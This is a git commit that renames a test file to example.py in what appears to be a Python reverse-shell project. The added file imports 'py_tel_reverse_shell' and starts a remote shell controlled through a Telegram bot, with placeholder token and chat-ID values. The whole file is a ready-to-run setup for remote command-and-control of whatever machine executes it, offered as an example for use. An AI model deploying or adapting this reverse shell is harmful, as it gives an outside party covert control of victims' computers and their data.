4b1b88912a1a03e24a27505a41e16a8ce566ec08
Torham <torhamdev@gmail.com>
2022-09-06 19:07:44 +0430

    Rename test.py to example.py

---
+++ example.py
@@ -0,0 +1,10 @@
+from py_tel_reverse_shell import tel_shell
+
+
+# get token from @BotFather in telegram
+my_token = "2018473XXXXXXXXXXXXXXXXXXXXX-3M"
+# get your number id from @userinfobot in telegram
+my_chat_id = "19XXXXX25"
+
+
+tel_shell.start_shell(bot_token=my_token, chat_id=my_chat_id)
